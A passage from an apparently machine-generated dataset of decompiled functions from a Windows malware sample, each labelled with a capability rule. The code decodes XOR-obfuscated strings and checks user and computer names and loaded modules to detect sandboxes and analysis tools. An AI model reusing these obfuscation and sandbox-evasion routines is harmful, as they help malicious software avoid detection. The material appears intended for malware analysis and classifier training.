        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040ad3b(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint nNumberOfBytesToWrite;\n    int32_t iVar4;\n    code *pcVar5;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uint var_53h;\n    uint var_4fh;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    int32_t hHeap;\n    \n    iVar4 = 8;\n    lpString2 = param_1;\n    var_10h = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_10h * 2 + 0x1a);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (iVar2 != 0) {\n            var_8h = iVar2;\n            uVar1 = (*pcVar5)(8, var_10h * 2 + 6);\n            hHeap = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (hHeap != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar2, lpString2);\n                var_18h = fcn.00404549();\n                var_18h = var_18h + 2;\n                var_34h = 0x342a756e;\n                var_30h = 0x75657527;\n                var_2ch = 0x75333424;\n                var_28h = 0x3446753f;\n                var_24h = 0x3446754b;\n                var_20h._0_2_ = 0x7552;\n                uVar1 = (*pcVar5)(8, 0x21);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                var_10h = 6;\n                iVar4 = 0;\n                var_1ch = iVar2;\n                do {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                    if (iVar3 != 0xb70f65) {\n                        *(iVar4 + iVar2) = *(&var_24h + iVar4 % var_10h) ^ (iVar4 + iVar2)[&var_34h - iVar2];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0x10);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar5 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_18h, iVar2, uVar1);\n                (*pcVar5)(hHeap, L\"\\\"%s\\\"\", lpString2);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar4 = 8;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                if (lpString2 != 0) {\n                    var_14h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_80h = 0x1b001a52;\n                    var_7ch = 0x43131422;\n                    var_78h._0_1_ = 6;\n                    stack0xffffff85 = 0x13056649;\n                    var_73h = 0x6e491c43;\n                    var_6fh = 0x7e630253;\n                    var_6bh = 0x3e036e53;\n                    var_67h = 0x270c1064;\n                    var_63h = 0x454b1656;\n                    var_5fh = 0x551f4164;\n                    var_5bh = 0x2211114e;\n                    var_57h = 0x514e4705;\n                    var_53h = 0x54567a4c;\n                    var_4fh._0_2_ = 1;\n                    stack0xffffffb0 = 0x6346536b;\n                    var_48h = 0x1a2e0d7e;\n                    var_44h = 0x59514b13;\n                    var_40h._0_2_ = 0x7c46;\n                    var_40h._2_1_ = 0x33;\n                    var_24h = 0x69746e33;\n                    var_20h._0_2_ = 0x764b;\n                    var_4fh._2_1_ = var_78h;\n                    uVar1 = (*pcVar5)(8, 0x44);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar4 = 0;\n                    var_18h = &var_80h - iVar3;\n                    do {\n                        iVar2 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                        if (iVar2 != 0xf28abf) {\n                            *(iVar4 + iVar3) = *(&var_24h + iVar4 % var_10h) ^ (iVar4 + iVar3)[&var_80h - iVar3];\n                        }\n                        iVar4 = iVar4 + 1;\n                    } while (iVar4 < 0x43);\n                    uVar1 = var_14h;\n                    nNumberOfBytesToWrite = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar3, var_14h, var_14h);\n                    iVar4 = fcn.0040c7ca(nNumberOfBytesToWrite);\n                    iVar2 = var_1ch;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.0040ab8f(uVar1);\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                }\n                uVar1 = (*pcVar5)(0, hHeap);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                iVar2 = var_8h;\n            }\n            uVar1 = (*pcVar5)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 1736
    },
    "004087dc": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004087dc(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *extraout_ECX_01;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_d8h;\n    uint var_d4h;\n    uint pcbBuffer;\n    int32_t var_cch;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    int32_t var_c0h;\n    int32_t var_bch;\n    int32_t var_b8h;\n    int32_t var_b4h;\n    int32_t var_b0h;\n    uint var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    int32_t var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    ushort var_48h;\n    uchar var_46h;\n    uint var_45h;\n    uint var_41h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.00408622();\n    if (iVar4 != 0) {\n        fcn.004087c4();\n    }\n    var_14h = 0x251f5754;\n    var_10h._0_1_ = 0x11;\n    var_10h._1_1_ = 0x5c;\n    var_10h._2_1_ = 0x45;\n    var_10h._3_1_ = 0x56;\n    var_ch._0_1_ = 0x29;\n    var_ch._1_1_ = 0x18;\n    var_ch._2_1_ = 0x5c;\n    var_ch._3_1_ = 0x35;\n    var_a0h = 0x4d783530;\n    var_9ch._0_1_ = 0x74;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_34h = 5;\n    iVar11 = 0;\n    var_2ch = &var_14h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar6 != 0x57440a) {\n            *(iVar11 + iVar4) = *(&var_a0h + iVar11 % var_34h) ^ (iVar11 + iVar4)[&var_14h - iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 != 0) {\n        fcn.004087c4();\n    }\n    var_14h = 0x135f092b;\n    var_10h._0_1_ = 0x14;\n    var_10h._1_1_ = 0x28;\n    var_10h._2_1_ = 0x34;\n    var_10h._3_1_ = 0x45;\n    var_ch._0_1_ = 0x52;\n    var_ch._1_1_ = 0x1a;\n    var_ch._2_1_ = 0x1c;\n    var_ch._3_1_ = 0x44;\n    var_b0h = 0x76366b58;\n    var_ach._0_2_ = 0x4470;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_3ch = 6;\n    iVar6 = 0;\n    var_a0h = iVar11;\n    var_2ch = &var_14h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar7 != 0x60588b) {\n            *(iVar6 + iVar11) = *(&var_b0h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[&var_14h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 != 0) {\n        fcn.004087c4();\n    }\n    pcbBuffer = 0x400;\n    iVar11 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41dde0, &pcbBuffer);\n    if (iVar11 == 0) {\n        fcn.004087c4();\n    }\n    var_14h = 0x380b0371;\n    var_10h._0_1_ = 0x32;\n    var_10h._1_1_ = 0x5c;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0x2c;\n    var_ch._0_1_ = 0x39;\n    var_ch._1_1_ = 0x32;\n    var_ch._2_1_ = 0x40;\n    var_ch._3_1_ = 0x76;\n    var_98h = 0x4a797632;\n    var_94h._0_1_ = 0x57;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_b0h = iVar11;\n    var_2ch = &var_14h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar7 != 0xda156a) {\n            *(iVar6 + iVar11) = *(&var_98h + iVar6 % var_34h) ^ (iVar6 + iVar11)[&var_14h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.004087c4();\n    }\n    var_10h._0_1_ = 9;\n    var_10h._1_1_ = 5;\n    var_10h._2_1_ = 0x5f;\n    var_10h._3_1_ = 2;\n    var_ch._0_1_ = 0x18;\n    var_ch._1_1_ = 0x35;\n    var_ch._2_1_ = 0x1c;\n    var_ch._3_1_ = 0x31;\n    var_90h = 0x6631645a;\n    var_8ch._0_1_ = 0x7a;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_98h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar7 != 0x78c66a) {\n            *(iVar6 + iVar11) = *(&var_90h + iVar6 % var_34h) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.004087c4();\n    }\n    pcbBuffer = 0x400;\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41dde0, &pcbBuffer);\n    if (iVar11 == 0) {\n        fcn.004087c4();\n    }\n    var_10h._0_1_ = 0x1a;\n    var_10h._1_1_ = 0x23;\n    var_10h._2_1_ = 0x20;\n    var_10h._3_1_ = 0x36;\n    var_ch._0_1_ = 0x10;\n    var_ch._1_1_ = 0xd;\n    var_ch._2_1_ = 0x11;\n    var_ch._3_1_ = 0x62;\n    var_a8h = 0x726e6249;\n    var_a4h._0_2_ = 0x4252;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_90h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar7 != 0xd962b1) {\n            *(iVar6 + iVar11) = *(&var_a8h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.004087c4();\n    }\n    var_10h._0_1_ = 0x58;\n    var_10h._1_1_ = 0x38;\n    var_10h._2_1_ = 5;\n    var_10h._3_1_ = 0x7e;\n    var_ch._0_1_ = 0x10;\n    var_ch._1_1_ = 0x26;\n    var_ch._2_1_ = 0x2a;\n    var_ch._3_1_ = 0x4c;\n    var_8h = 0x324c6b6f;\n    var_4h._0_1_ = 0x46;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_a8h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar7 != 0x1f8c58) {\n            *(iVar6 + iVar11) = *(&var_8h + iVar6 % var_34h) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.004087c4();\n    }\n    var_5ch = 0x32b7302;\n    var_58h = 0x77187520;\n    var_54h = 0x67320325;\n    var_50h = 0x17306009;\n    var_4ch._0_2_ = 0x7d23;\n    var_4ch._2_1_ = 5;\n    var_4ch._3_1_ = 0x7c;\n    var_48h = 0x1425;\n    var_46h = 0xe;\n    var_45h = 0x14573e47;\n    var_41h._0_1_ = 0x47;\n    var_8h = 0x4779324a;\n    var_4h._0_1_ = 0x77;\n    var_4h._1_1_ = 0x34;\n    uVar5 = (*pcVar2)(8, 0x1d);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_2ch = &var_5ch - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar7 != 0x49a67e) {\n            *(iVar6 + iVar11) = *(&var_8h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[&var_5ch - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x1c);\n    var_1ch = 0x5122b26;\n    var_18h = 0x810182f;\n    var_14h = 0x3723391e;\n    var_10h._0_1_ = 0x13;\n    var_10h._1_1_ = 2;\n    var_10h._2_1_ = 0x23;\n    var_10h._3_1_ = 0x1a;\n    var_ch._0_1_ = 0x3c;\n    var_ch._1_1_ = 0x61;\n    var_8h = 0x71615275;\n    var_4h._0_1_ = 0x4a;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_cch = &var_1ch - iVar6;\n    var_2ch = iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        puVar9 = extraout_ECX;\n        if (iVar8 != 0x70d831) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_8h + iVar7 % var_34h) ^ puVar9[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x12);\n    cVar3 = fcn.004085c6(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.004087c4();\n    }\n    var_8h = 0x657c7407;\n    var_4h._0_1_ = 0x30;\n    var_28h = 0x45353946;\n    var_24h._0_2_ = 0x5530;\n    uVar5 = (*pcVar2)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_cch = iVar6;\n    var_c8h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar8 != 0x88d8e) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_28h = 0x1770b35;\n    var_24h._0_2_ = 0x770b;\n    var_8h = 0x49344477;\n    var_4h._0_1_ = 0x58;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 7);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c8h = iVar6;\n    var_c4h = &var_28h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar8 != 0x62b3a2) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_28h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 6);\n    var_8h = 0x15172a06;\n    var_4h._0_1_ = 0x71;\n    var_28h = 0x4d586850;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x71);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c4h = iVar6;\n    var_c0h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar8 != 0xa3bf69) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_8h = 0x652e0a0b;\n    var_4h._0_1_ = 0x49;\n    var_28h = 0x30634f5a;\n    var_24h._0_2_ = 0x7549;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c0h = iVar6;\n    var_bch = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar8 != 0x479407) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_8h = 0x1d262712;\n    var_4h._0_1_ = 0x69;\n    var_28h = 0x54656a41;\n    var_24h._0_2_ = 0x7069;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_bch = iVar6;\n    var_b8h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar8 != 0xf48cfc) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_1ch = 0x8380910;\n    var_18h = 0x41677909;\n    var_14h = 0x7369736d;\n    var_10h._0_1_ = 0x5c;\n    var_10h._1_1_ = 0x7d;\n    var_10h._2_1_ = 0x75;\n    var_10h._3_1_ = 0x69;\n    var_ch._0_1_ = 0x47;\n    var_8h = 0x4d6c4759;\n    var_4h._0_1_ = 0x45;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_b8h = iVar6;\n    var_b4h = &var_1ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar8 != 0xbc6f2f) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x11);\n    var_10h._0_1_ = 0x1f;\n    var_10h._1_1_ = 0x60;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x2c;\n    var_ch._0_1_ = 99;\n    var_ch._1_1_ = 0x68;\n    var_ch._2_1_ = 0x34;\n    var_8h = 0x78693459;\n    var_4h._0_1_ = 0x4e;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_b4h = iVar6;\n    var_30h = &var_10h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar8 != 0x9cc651) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_10h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 7);\n    var_28h = 0x3142303;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x45);\n    var_70h = 0x4a5a6c50;\n    var_6ch._0_2_ = 0x4745;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_30h = &var_28h - iVar6;\n    var_8h = iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar8 != 0x2bba68) {\n            *(iVar7 + iVar6) = *(&var_70h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_28h - iVar6];\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    *0x41e1f0 = var_cch;\n    *0x41e1f8 = var_c8h;\n    *0x41e1fc = var_c4h;\n    *0x41e200 = var_c0h;\n    *0x41e204 = var_bch;\n    uVar10 = 0;\n    *0x41e208 = var_b8h;\n    *0x41e20c = var_b4h;\n    *0x41e210 = iVar6;\n    do {\n        iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, *(uVar10 + 0x41e1f0));\n        if (iVar6 != 0) {\n            fcn.004087c4();\n        }\n        uVar10 = uVar10 + 4;\n    } while (uVar10 < 0x20);\n    var_1ch = 0x3d521e1d;\n    var_18h = 0x18222d5e;\n    var_14h = 0x1d540e45;\n    var_10h._0_1_ = 0x38;\n    var_10h._1_1_ = 0x1e;\n    var_10h._2_1_ = 0x59;\n    var_10h._3_1_ = 0x36;\n    var_ch._0_1_ = 0x31;\n    var_70h = 0x5836774b;\n    var_6ch._0_2_ = 0x6f31;\n    uVar5 = (*pcVar2)(8, 0x12);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_30h = &var_1ch - iVar6;\n    var_28h = iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetInputState)();\n        puVar9 = extraout_ECX_00;\n        if (iVar8 != 0xb36dba) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_70h + iVar7 % var_3ch) ^ puVar9[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x11);\n    cVar3 = fcn.004085c6(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.004087c4();\n    }\n    var_14h = 0x1701393d;\n    var_10h._0_1_ = 0x24;\n    var_10h._1_1_ = 10;\n    var_10h._2_1_ = 0x3c;\n    var_10h._3_1_ = 0x31;\n    var_ch._0_1_ = 0xc;\n    var_ch._1_1_ = 0x29;\n    var_ch._2_1_ = 0x6b;\n    var_88h = 0x6373506b;\n    var_84h._0_1_ = 0x51;\n    uVar5 = (*pcVar2)(8, 0xc);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_70h = iVar6;\n    var_30h = &var_14h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar8 != 0xad844f) {\n            *(iVar7 + iVar6) = *(&var_88h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_14h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xb);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 != 0) {\n        fcn.004087c4();\n    }\n    var_68h = 0x303c2620;\n    var_64h = 0x3f3b321a;\n    var_60h = 0xa1a0038;\n    var_5ch = 0x1c3e0b08;\n    var_58h = 0x1a380e0f;\n    var_54h = 0xb1e071a;\n    var_50h = 0x3935003a;\n    var_4ch._0_2_ = 0x3f11;\n    var_4ch._2_1_ = 1;\n    var_4ch._3_1_ = 0xc;\n    var_48h = 0x1014;\n    var_46h = 0x1b;\n    var_45h = 0xd091b16;\n    var_41h._0_1_ = 0x22;\n    var_41h._1_2_ = 0x691d;\n    var_80h = 0x647a6973;\n    var_7ch._0_1_ = 0x4d;\n    uVar5 = (*pcVar2)(8, 0x2b);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_88h = iVar6;\n    var_30h = &var_68h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        puVar9 = extraout_ECX_01;\n        if (iVar8 != 0x5e5db4) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_80h + iVar7 % var_34h) ^ puVar9[&var_68h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x2a);\n    cVar3 = fcn.004085c6(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.004087c4();\n    }\n    var_20h = 0x73487b76;\n    var_1ch = 0x4e786e50;\n    var_18h = 0x78714974;\n    var_14h = 0x7554774d;\n    var_10h._0_1_ = 0x7a;\n    var_10h._1_1_ = 0x57;\n    var_10h._2_1_ = 0x76;\n    var_10h._3_1_ = 0x57;\n    var_ch._0_1_ = 0x7a;\n    var_ch._1_1_ = 0x7b;\n    var_ch._2_1_ = 0x4a;\n    var_ch._3_1_ = 0x44;\n    var_78h = 0x447a4e43;\n    var_74h._0_1_ = 100;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_80h = iVar6;\n    var_30h = &var_20h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar8 != 0x6bfbef) {\n            *(iVar7 + iVar6) = *(&var_78h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_20h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 != 0) {\n        fcn.004087c4();\n    }\n    var_58h = 0xb757f7d;\n    var_54h = 0x7d7c7707;\n    var_50h = 0x6b031e75;\n    var_4ch._0_2_ = 0x7e7d;\n    var_4ch._2_1_ = 0x71;\n    var_4ch._3_1_ = 0;\n    var_48h = 0x7707;\n    var_46h = 0x78;\n    var_45h = 0x2747a;\n    var_41h._0_1_ = 0x5a;\n    var_10h._0_1_ = 0x4a;\n    var_10h._1_1_ = 0x49;\n    var_10h._2_1_ = 0x41;\n    var_10h._3_1_ = 0x33;\n    var_ch._0_1_ = 0x30;\n    var_ch._1_1_ = 0x5a;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = 